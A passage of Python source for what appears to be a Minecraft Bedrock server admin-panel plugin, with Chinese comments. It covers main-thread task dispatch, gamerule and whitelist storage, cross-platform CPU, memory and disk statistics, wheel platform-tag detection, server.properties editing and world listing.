        为一个纯校验函数多传一个 ``self`` 不值得争议。
        """
        try:
            if not pixels or len(pixels) != 128:
                return False
            for row in pixels:
                if len(row) != 128:
                    return False
            return True
        except Exception:
            return False

    def is_on_main_thread(self) -> bool:
        """当前是否运行在服务器主线程上。

        给「需要 dispatch_command 又要等结果」的调用方用（正则引擎的
        ``executeCommand`` 动作）。这类逻辑的典型写法是
        ``run_on_main(run)`` 然后 ``event.wait()`` —— 一旦调用点本身就在
        主线程，那是在等自己把活干完，会**永久卡死**整个服务器。

        所以调用方必须先问一句这里，主线程就同步直接跑。

        ``_main_thread_id`` 为 None（on_enable 还没跑到）时返回 False，
        走正常的调度路径 —— 那时确实还没法确定身份。
        """
        main_id = getattr(self, "_main_thread_id", None)
        if main_id is None:
            return False
        try:
            return threading.current_thread().ident == main_id
        except Exception:
            return False

    def _run_in_server_thread(self, func: Callable, *args, timeout: float = 5.0, **kwargs):
        name = getattr(func, "__name__", str(func))
        try:
            cur_id = threading.current_thread().ident
        except Exception:
            cur_id = None
        if self._main_thread_id is not None and cur_id == self._main_thread_id:
            try:
                return func(*args, **kwargs)
            except Exception as e:
                self.logger.error(f"主线程任务执行异常: {e}")
                return False, f"主线程任务执行异常: {e}"

        if not self._mainthread_sem.acquire(timeout=0.5):
            self._log_diag("busy", {"name": name})
            return False, "服务器繁忙，请稍后重试"
        try:
            result_holder = []
            exception_holder = []
            event = threading.Event()

            def task():
                try:
                    self._pt_mark_begin(name, None)
                    try:
                        result_holder.append(func(*args, **kwargs))
                    except Exception as e:
                        exception_holder.append(e)
                finally:
                    self._pt_mark_end()
                    event.set()

            try:
                self.server.scheduler.run_task(self, task)
            except Exception as e:
                self.logger.error(f"调度主线程任务失败: {e}")
                return False, f"主线程调度失败: {e}"

            if not event.wait(timeout):
                cur = self._pt_current_name()
                try:
                    with self._tick_lock:
                        gap = round(self._tick_gap_ms, 1)
                except Exception:
                    gap = -1
                if self._diag_on():
                    self._log_diag("timeout", {"name": name, "current": cur, "pending": self._pt_pending, "tick_gap_ms": gap})
                if self._diag_on() and self._diag_verbose():
                    self.logger.error(
                        f"[诊断] 主线程任务执行超时: 请求任务={name}  主线程当前在执行={cur}  排队={self._pt_pending}  tick间隔={gap}ms{chr(10)}"
                        f"---- 全线程栈 ----{chr(10)}{self._dump_all_stacks()}")
                elif self._diag_on():
                    self.logger.warning(f"[诊断] 主线程任务执行超时: {name}")
                return False, "主线程任务执行超时，请重试"

            if exception_holder:
                self.logger.error(f"主线程任务执行异常: {exception_holder[0]}")
                return False, f"主线程任务执行异常: {exception_holder[0]}"
            return result_holder[0] if result_holder else (False, "主线程任务无返回结果")
        finally:
            try:
                self._mainthread_sem.release()
            except Exception:
                pass

    def _run_async_on_server_thread(self, func: Callable, *args):

        def task():
            try:
                func(*args)
            except Exception as e:
                self.logger.error(f"主线程异步任务异常: {e}")

        try:
            self.server.scheduler.run_task(self, task)
        except Exception as e:
            self.logger.error(f"调度主线程异步任务失败: {e}")

    def _load_gamerules(self):
        defaults = {g["name"]: g["default"] for g in GAMERULES}
        self._gamerule_values = dict(defaults)
        path = self.data_dir / "gamerules.json"
        if path.exists():
            try:
                with open(path, "r", encoding="utf-8") as f:
                    saved = json.load(f)
                for name, val in saved.items():
                    if name in defaults:
                        self._gamerule_values[name] = val
            except Exception as e:
                self.logger.error(f"加载 gamerules.json 失败: {e}")

    def _save_gamerules(self):
        try:
            path = self.data_dir / "gamerules.json"
            if not atomic_write_json(path, self._gamerule_values, indent=2):
                raise RuntimeError("原子写入失败")
        except Exception as e:
            self.logger.error(f"保存 gamerules.json 失败: {e}")

    def get_gamerules(self):
        result = []
        for g in GAMERULES:
            item = dict(g)
            item["value"] = self._gamerule_values.get(g["name"], g["default"])
            result.append(item)
        return result

    def _load_whitelist(self):
        path = self.data_dir / "whitelist.json"
        if not path.exists():
            return
        try:
            with self._whitelist_lock:
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                apps = data.get("applications", []) if isinstance(data, dict) else data
                if isinstance(apps, list):
                    for a in apps:
                        name = str(a.get("name", "")).strip()
                        if name:
                            self._whitelist_apps[name.lower()] = a
        except Exception as e:
            self.logger.error(f"加载 whitelist.json 失败: {e}")

    def _save_whitelist(self):
        try:
            path = self.data_dir / "whitelist.json"
            with self._whitelist_lock:
                apps = list(self._whitelist_apps.values())
            if not atomic_write_json(path, {"applications": apps}, indent=2):
                raise RuntimeError("原子写入失败")
        except Exception as e:
            self.logger.error(f"保存 whitelist.json 失败: {e}")

    def _list_whitelist_apps(self):
        with self._whitelist_lock:
            apps = list(self._whitelist_apps.values())
        order = {"pending": 0, "approved": 1, "rejected": 2}
        apps.sort(key=lambda a: str(a.get("applied_at", "")), reverse=True)
        apps.sort(key=lambda a: order.get(str(a.get("status", "pending")), 9))
        return apps

    def _read_cpu_ticks(self):
        """读 CPU 累计 tick，返回 ``(total, idle)``，失败返回 ``(None, None)``。

        ★ 跨平台：Windows 没有 ``/proc/stat``，必须走 ``GetSystemTimes``。
        旧实现只读 ``/proc/stat``，在 Windows 上永远返回 ``(None, None)``，
        于是 ``stats["cpu"]`` 恒为 0.0 —— 面板上 CPU 曲线是一条死线，
        但没有任何报错，所以一直没人发现。
        """
        if os.name == "nt":
            return self._read_cpu_ticks_windows()
        try:
            with open("/proc/stat", "r") as f:
                parts = f.readline().split()
            nums = [int(x) for x in parts[1:8]]
            total = sum(nums)
            idle = nums[3] + nums[4]
            return total, idle
        except Exception:
            return None, None

    @staticmethod
    def _read_cpu_ticks_windows():
        """用 ``GetSystemTimes`` 取 Windows 的 CPU 累计时间（单位 100ns）。

        返回的 idle/kernel/user 都是**累计值**，正好与 ``/proc/stat`` 一样
        只需要「两次采样的差值」，所以可以直接复用同一套百分比算法。

        注意 kernel 时间里**已包含** idle 时间，所以：
            total = kernel + user
            idle  = idle
        而不是 total = kernel + user + idle（那会把 idle 算两遍）。
        """
        try:
            import ctypes
            from ctypes import wintypes

            class FILETIME(ctypes.Structure):
                _fields_ = [("dwLowDateTime", wintypes.DWORD),
                            ("dwHighDateTime", wintypes.DWORD)]

            def _to_int(ft):
                return (ft.dwHighDateTime << 32) | ft.dwLowDateTime

            idle = FILETIME()
            kernel = FILETIME()
            user = FILETIME()
            ok = ctypes.windll.kernel32.GetSystemTimes(
                ctypes.byref(idle), ctypes.byref(kernel), ctypes.byref(user))
            if not ok:
                return None, None
            i = _to_int(idle)
            k = _to_int(kernel)
            u = _to_int(user)
            return k + u, i
        except Exception:
            return None, None

    def _read_mem(self):
        """返回 ``(total_bytes, avail_bytes)``，失败返回 ``(0.0, 0.0)``。

        ★ 单位坑：``/proc/meminfo`` 的值单位是 **kB**，不是 B。
        旧实现直接 ``total / 1024`` 就当 MB 用，于是 ``mem_total_mb`` 只有
        真实值的 **1/1024**。百分比因为分子分母同源所以是对的，
        只有绝对数值错 —— 这就是它长期没被发现的原因。
        """
        if os.name == "nt":
            return self._read_mem_windows()
        try:
            vals = {}
            with open("/proc/meminfo", "r") as f:
                for line in f:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        num = parts[1].strip().split()
                        if num:
                            vals[parts[0]] = float(num[0])
            # kB → B
            total = vals.get("MemTotal", 0.0) * 1024.0
            avail = vals.get("MemAvailable", 0.0) * 1024.0
            return total, avail
        except Exception:
            return 0.0, 0.0

    @staticmethod
    def _read_mem_windows():
        """用 ``GlobalMemoryStatusEx`` 取 Windows 物理内存（单位已是字节）。"""
        try:
            import ctypes
            from ctypes import wintypes

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", wintypes.DWORD),
                    ("dwMemoryLoad", wintypes.DWORD),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            st = MEMORYSTATUSEX()
            st.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ok = ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(st))
            if not ok:
                return 0.0, 0.0
            return float(st.ullTotalPhys), float(st.ullAvailPhys)
        except Exception:
            return 0.0, 0.0

    def _disk_usage_path(self):
        """磁盘统计的目标路径：**数据目录所在卷**。

        ★ 旧实现写死 ``shutil.disk_usage("/")``，在 Windows 上会落到
        「当前工作盘」—— 服务器装在 D:\\ 而 BDS 从 C:\\ 启动时，
        面板显示的容量是 C 盘的，张冠李戴。而且完全没有报错。
        取 data_dir 所在卷才是用户真正关心的地方（日志、存档都在那儿）。
        """
        try:
            d = getattr(self, "data_dir", None)
            if d is not None:
                p = Path(d)
                # 目录可能还没建出来，向上找到第一个存在的祖先
                for _ in range(8):
                    if p.exists():
                        return str(p)
                    parent = p.parent
                    if parent == p:
                        break
                    p = parent
        except Exception:
            pass
        return str(Path.cwd())

    def _env_info(self) -> Dict[str, Any]:
        """运行环境信息：操作系统、CPU 架构、Python 版本，以及**第三方库下载标识**。

        为什么需要这个：用户要给面板装第三方库（.gmlib / wheel），但不知道该下
        哪个包。Windows 和 Linux 的 wheel 不通用，32/64 位不通用，Python 3.11
        和 3.12 也不通用 —— 下载页上那几个标签（cp311 / win_amd64 / manylinux）
        对普通用户来说完全是天书。

        这里直接把当前环境**该用哪个标签**算出来，用户照着复制就行。

        返回字段：
          os_name      平台名（Windows / Linux / macOS）
          os_detail    带版本号的详细名
          arch         CPU 架构（x86_64 / aarch64 / arm64 ...）
          bits         位数（32 / 64）
          python       Python 版本（3.11.9）
          python_tag   wheel 用的 Python 标签（cp311）
          platform_tag wheel 用的平台标签（win_amd64）
          pip_target   pip download 时该填的值，形如 cp311-win_amd64
          libext       本机可用的库文件后缀（.gmlib / .so / .dylib / .dll）
        """
        import platform as _platform

        info: Dict[str, Any] = {}
        try:
            system = _platform.system() or os.name
        except Exception:
            system = os.name

        # —— 平台名 ——
        try:
            if system == "Windows":
                rel = _platform.release() or ""
                ver = _platform.version() or ""
                info["os_name"] = "Windows"
                # Windows 11 的内核版本号仍是 10.0，靠 build 号区分见 _win_build()
                info["os_detail"] = ("Windows " + rel).strip()
                info["windows_build"] = self._win_build()
                if info["windows_build"]:
                    info["os_detail"] = self._win_friendly(info["windows_build"]) + \
                        f"（build {info['windows_build']}）"
            elif system == "Darwin":
                info["os_name"] = "macOS"
                try:
                    macver = _platform.mac_ver()[0]
                except Exception:
                    macver = ""
                info["os_detail"] = f"macOS {macver}".strip() if macver else "macOS"
            elif system == "Linux":
                info["os_name"] = "Linux"
                info["os_detail"] = self._linux_pretty_name() or "Linux"
            else:
                info["os_name"] = system or "未知"
                info["os_detail"] = system or "未知"
        except Exception:
            info["os_name"] = info.get("os_name", "未知")
            info["os_detail"] = info.get("os_detail", "未知")

        # —— CPU 架构 ——
        try:
            machine = (_platform.machine() or "").lower()
        except Exception:
            machine = ""
        # 归一化：不同平台叫法不一，统一成 pip 认的那套
        arch_alias = {
            "amd64": "x86_64", "x64": "x86_64", "x86_64": "x86_64",
            "i386": "i686", "i486": "i686", "i586": "i686", "i686": "i686",
            "x86": "i686",
            "aarch64": "aarch64", "arm64": "arm64",
            "armv7l": "armv7l", "armv6l": "armv6l",
            "ppc64le": "ppc64le", "s390x": "s390x",
        }
        arch = arch_alias.get(machine, machine or "未知")
        info["arch"] = arch
        info["arch_raw"] = machine

        # —— 位数 ——
        try:
            info["bits"] = 64 if sys.maxsize > 2 ** 32 else 32
        except Exception:
            info["bits"] = 0

        # —— Python 版本 ——
        try:
            v = sys.version_info
            info["python"] = f"{v.major}.{v.minor}.{v.micro}"
            # wheel 标签：cp311 / cp312；PyPy 是 pp39 之类
            impl = "cp"
            try:
                if _platform.python_implementation() == "PyPy":
                    impl = "pp"
            except Exception:
                pass
            info["python_tag"] = f"{impl}{v.major}{v.minor}"
        except Exception:
            info["python"] = ""
            info["python_tag"] = ""

        # —— wheel 平台标签（决定该下哪个包） ——
        info["platform_tag"] = self._wheel_platform_tag(
            info.get("os_name"), arch, info.get("bits"))

        pt, ptg = info.get("python_tag") or "", info.get("platform_tag") or ""
        info["pip_target"] = f"{pt}-{ptg}" if (pt and ptg) else ""

        # —— 本机库文件后缀（面板自己的 .gmlib 用哪个平台包） ——
        info["libext"] = {
            "Windows": ".dll",
            "Linux": ".so",
            "macOS": ".dylib",
        }.get(info.get("os_name"), ".so")

        # —— 面板离线库包的平台名（greenmoon-libs-<名>.gmlib） ——
        info["lib_bundle"] = self._lib_bundle_name(info.get("os_name"), arch)

        return info

    @staticmethod
    def _win_build():
        """取 Windows build 号。失败返回 0。"""
        try:
            return int(__import__("platform").win32_ver()[1].split(".")[-1])
        except Exception:
            return 0

    @staticmethod
    def _win_friendly(build: int) -> str:
        """用 build 号区分 Win10 / Win11。

        ★ 不能只看 ``platform.release()`` —— Windows 11 返回的仍是 "10"，
        真正区分靠 build 号（22000 及以上是 Win11）。
        """
        if not build:
            return "Windows"
        if build >= 22000:
            return "Windows 11"
        if build >= 10240:
            return "Windows 10"
        if build >= 9200:
            return "Windows 8"
        if build >= 7600:
            return "Windows 7"
        return "Windows"

    @staticmethod
    def _linux_pretty_name() -> str:
        """从 /etc/os-release 取发行版名（如 'Ubuntu 22.04.3 LTS'）。"""
        try:
            for line in Path("/etc/os-release").read_text(
                    encoding="utf-8", errors="replace").splitlines():
                if line.startswith("PRETTY_NAME="):
                    return line.split("=", 1)[1].strip().strip('"')
        except Exception:
            pass
        return ""

    @staticmethod
    def _wheel_platform_tag(os_name, arch: str, bits) -> str:
        """算出 pip 的 platform tag，用户拿它去下载对应的 wheel。

        这套命名沿用 PEP 425。常见组合：

          Windows  64 位 x86  -> win_amd64
          Windows  32 位      -> win32
          Windows  arm64      -> win_arm64
          Linux    x86_64     -> manylinux2014_x86_64（最通用，兼容多数发行版）
          Linux    aarch64    -> manylinux2014_aarch64
          macOS    x86_64     -> macosx_10_9_x86_64
          macOS    arm64      -> macosx_11_0_arm64
        """
        try:
            if os_name == "Windows":
                if arch == "x86_64":
                    return "win_amd64"
                if arch in ("arm64", "aarch64"):
                    return "win_arm64"
                return "win32"
            if os_name == "macOS":
                if arch in ("arm64", "aarch64"):
                    # Apple Silicon 从 11.0 起才有原生 arm64 wheel
                    return "macosx_11_0_arm64"
                return "macosx_10_9_x86_64"
            if os_name == "Linux":
                if arch == "x86_64":
                    return "manylinux2014_x86_64"
                # arm64 和 aarch64 是同一个东西的两个叫法（前者 Apple/Windows
                # 习惯，后者 Linux 内核习惯），两个都得认，否则 ARM 服务器上
                # 会退化成 linux_arm64 这种 pip 不认的标签。
                if arch in ("aarch64", "arm64"):
                    return "manylinux2014_aarch64"
                if arch == "i686":
                    return "manylinux2014_i686"
                if arch == "ppc64le":
                    return "manylinux2014_ppc64le"
                if arch == "s390x":
                    return "manylinux2014_s390x"
                return f"linux_{arch}"
        except Exception:
            pass
        return ""

    @staticmethod
    def _lib_bundle_name(os_name, arch: str) -> str:
        """面板自带离线库包的平台名（对应 greenmoon-libs-<名>.gmlib）。"""
        if os_name == "Windows":
            return "win-x64" if arch == "x86_64" else "win-arm64"
        if os_name == "macOS":
            return "macos-arm64" if "arm" in (arch or "") else "macos-x64"
        if os_name == "Linux":
            if arch in ("aarch64", "arm64"):
                return "linux-arm64"
            return "linux-x64"
        return ""

    def get_system_stats(self) -> Dict[str, Any]:
        stats: Dict[str, Any] = {}

        try:
            t, i = self._read_cpu_ticks()
            with self._stats_lock:
                prev = self._cpu_prev
                cpu = 0.0
                if t is not None and prev and prev[0] and t > prev[0]:
                    d_total = t - prev[0]
                    d_idle = max(0, i - prev[1])
                    cpu = max(0.0, min(100.0, (d_total - d_idle) / d_total * 100.0))
                self._cpu_prev = (t, i)
            stats["cpu"] = round(cpu, 1)
        except Exception:
            stats["cpu"] = 0.0

        try:
            total, avail = self._read_mem()
            used = max(0.0, total - avail)
            stats["mem"] = round(used / total * 100, 1) if total else 0.0
            # 字节 → MB
            stats["mem_total_mb"] = int(total / 1048576)
            stats["mem_used_mb"] = int(used / 1048576)
        except Exception:
            stats["mem"] = 0.0
            stats["mem_total_mb"] = 0
            stats["mem_used_mb"] = 0

        try:
            import shutil as _shutil
            du = _shutil.disk_usage(self._disk_usage_path())
            stats["disk"] = round(du.used / du.total * 100, 1)
            stats["disk_total_gb"] = round(du.total / 1073741824, 1)
            stats["disk_used_gb"] = round(du.used / 1073741824, 1)
        except Exception:
            stats["disk"] = 0.0
            stats["disk_total_gb"] = 0
            stats["disk_used_gb"] = 0


        try:
            stats["uptime"] = int(time.time() - (self._start_ts or time.time()))
        except Exception:
            stats["uptime"] = 0

        # 运行环境（供用户下载对应的第三方库）
        try:
            stats["env"] = self._env_info()
        except Exception:
            stats["env"] = {}
        return stats

    def _tps_start_job(self):
        pl = self
        with pl._tps_lock:
            st = pl._tps_state
            if st["running"]:
                return
            st["running"] = True
            st["count"] = 0
            st["first"] = 0.0
            st["last"] = 0.0
            st["done"] = False
        try:
            pl._tps_task = pl.server.scheduler.run_task(pl, pl._tps_tick, delay=0, period=1)
        except Exception as e:
            self.logger.error(f"启动 TPS 监测任务失败: {e}")

    def _tps_tick(self):
        pl = self
        with pl._tps_lock:
            st = pl._tps_state
            st["count"] += 1
            now = time.perf_counter()
            if st["first"] == 0.0:
                st["first"] = now
            st["last"] = now

    def _tps_finish_job(self):

        pl = self
        with pl._tps_lock:
            st = pl._tps_state
            try:
                if pl._tps_task is not None:
                    pl._tps_task.cancel()
                    pl._tps_task = None
            except Exception:
                pass
            st["running"] = False
            st["done"] = True
            st["seq"] += 1

    def _append_console_log(self, level: str, message: str):
        try:
            with self._console_lock:
                self._console_seq += 1
                self._console_logs.append({
                    "id": self._console_seq,
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "level": str(level or "INFO").upper(),
                    "message": str(message)[:2000],
                })
        except Exception:
            pass

    def _get_console_logs(self, after: int):
        with self._console_lock:
            last_id = self._console_seq
            # deque 内 id 单调递增，从尾部倒着找即可；
            # 正常增量轮询只取最后几条，是 O(1)，不必每次扫满 1000 条。
            new: List[Dict[str, Any]] = []
            for m in reversed(self._console_logs):
                if m["id"] <= after:
                    break
                new.append(m)
            new.reverse()
        return new, last_id

    def _log_admin_action(self, message: str):
        self._append_console_log("INFO", f"[GreenMoon] {message}")

    def _find_server_root(self) -> Optional[Path]:
        cur = self.data_dir
        for _ in range(8):
            if (cur / "server.properties").exists():
                return cur
            parent = cur.parent
            if parent == cur:
                break
            cur = parent
        return None

    def _read_properties_raw(self):
        root = self._find_server_root()
        if root is None:
            return None, ""
        path = root / "server.properties"
        try:
            return root, path.read_text(encoding="utf-8", errors="replace")
        except FileNotFoundError:
            return root, ""
        except Exception as e:
            self.logger.error(f"读取 server.properties 失败: {e}")
            return root, ""

    def _write_properties_raw(self, content: str):
        root = self._find_server_root()
        if root is None:
            return False, "未找到服务器目录（server.properties 不存在）"
        path = root / "server.properties"
        # server.properties 被写坏会导致服务端启动参数异常，
        # 所以走「备份 + 原子替换」；备份失败不阻断写入。
        if not atomic_write_text(path, content, backup=True):
            return False, "保存失败: 写入 server.properties 时出错"
        self._log_admin_action(f"已保存 server.properties")
        return True, "已保存 server.properties"

    def _get_property_value(self, content: str, key: str):
        target = str(key).strip().lower()
        for line in content.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            k, _, v = stripped.partition("=")
            if k.strip().lower() == target:
                return v.strip()
        return ""

    def _set_property_value(self, content: str, key: str, value) -> str:
        target = str(key).strip().lower()
        value_str = str(value)
        lines = content.splitlines()
        found = False
        for i, line in enumerate(lines):
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            k, _, _ = stripped.partition("=")
            if k.strip().lower() == target:
                lines[i] = f"{k.strip()}={value_str}"
                found = True
                break
        if not found:
            lines.append(f"{key.strip()}={value_str}")
        return "\n".join(lines)

    def _list_worlds(self):

        root = self._find_server_root()
        if root is None:
            return [], "", ""
        found: List[Dict[str, Any]] = []
        seen = set()

        worlds_dir = root / "worlds"
        dirs_to_scan = []
        if worlds_dir.is_dir():
            dirs_to_scan.extend(sorted(worlds_dir.iterdir()))

        dirs_to_scan.extend(sorted(root.iterdir()))
        for d in dirs_to_scan:
            try:
                if not d.is_dir() or d.name.startswith("."):
                    continue
                key = d.resolve()
                if key in seen:
                    continue
                seen.add(key)
                has_level = (d / "level.dat").exists()
                has_meta = (d / "levelname.txt").exists() or (d / "level.dat_old").exists()
                if has_level or has_meta:
                    found.append({
                        "name": d.name,
                        "path": str(d),
                        "valid": has_level,
                    })
            except Exception:
                continue

        _, content = self._read_properties_raw()
        current = self._get_property_value(content, "level-name")
        return found, current, str(root)

# ---- 子系统反向导入（在模块末尾，避免循环导入） ----
from .cross import CrossManager
from .qqbot import QQBotAPI, QQBotGateway, _TokenBucket, _GatewayLimiter
from .web import (
    AdminHTTPHandler,
    ThreadingHTTPServer,
    RateLimiter,
    ImageMapRenderer,
    attach_mapart_renderer,
    has_mapart_renderer,
    decode_bmp_24bit,
)